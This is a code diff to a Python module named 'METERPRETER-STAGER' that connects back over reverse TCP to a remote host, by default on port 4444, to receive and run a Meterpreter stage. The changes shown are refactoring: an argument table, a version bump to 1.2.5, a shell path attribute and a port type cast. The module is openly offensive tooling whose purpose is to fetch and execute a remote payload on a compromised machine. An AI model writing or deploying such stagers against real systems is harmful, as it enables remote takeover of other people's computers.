@@ -1,6 +1,6 @@
 ########################################################
 ### Meterpreter Module
-### Status: cleaned, 083
+### Status: migrated 084
 ###
 ########################################################
 
@@ -14,24 +14,33 @@ import struct
 CATEGORY    = 'stager'
 DESCRIPTION = 'Connect back (reverse_tcp) to remote host and receive a stage'
 
+arglist = {
+    'remote_host':         { 'value': None, 'desc': 'Remote host to connect to' },
+    'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
+    'timeout':             { 'value': 30, 'desc': 'Connect timeout in seconds, 30 seconds is the default' },
+    'architecture':        { 'value': 'x64', 'desc': 'Architecture to use, x64 is the default (x86/x64)' },
+    'sleeptime':           { 'value': 0, 'desc': 'Sleep for x seconds before the stage is executed' }
+}
+
 def register_arguments(parser):
-    parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
-    parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to')
+    parser.add_argument('-p', '--port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
+    parser.add_argument('-r', '--remote-host', type=str, required=True, help=arglist['remote_host']['desc'])
 
     grp = parser.add_argument_group('additional')
-    grp.add_argument('-a', '--arch', choices=['x64', 'x86'], default='x64', type=str, help= 'Architecture to use, x64 is the default')
-    grp.add_argument('-s', '--sleep', default=0, type=int, required=True, help='Sleep for x seconds before the stage is executed')
-    grp.add_argument('-t', '--timeout', default=30, type=int, help='Connect timeout in seconds, 30 seconds is the default')
+    grp.add_argument('-a', '--arch', choices=['x64', 'x86'], default='x64', type=str, help=arglist['architecture']['desc'])
+    grp.add_argument('-s', '--sleep', default=0, type=int, required=True, help=arglist['sleeptime']['desc'])
+    grp.add_argument('-t', '--timeout', default=30, type=int, help=arglist['timeout']['desc'])
 
 class module:
     
     Author          = 'raptor@0xdeadbeef.info, psycore8'
-    Version         = '1.2.4'
+    Version         = '1.2.5'
     DisplayName      = 'METERPRETER-STAGER'
     payload         = any
     payload_size    = int
     sock            = any
     relay_output    = False
+    shell_path      = '::stager::meterpreter'
 
     def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
         self.remote_host = remote_host
@@ -66,7 +75,7 @@ class module:
         self.msg('proc.sock')
         socket.setdefaulttimeout(self.timeout)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        con = self.sock.connect_ex((self.remote_host, self.remote_port))
+        con = self.sock.connect_ex((self.remote_host, int(self.remote_port)))
         if con == 0:
             self.msg('proc.con')
         else:
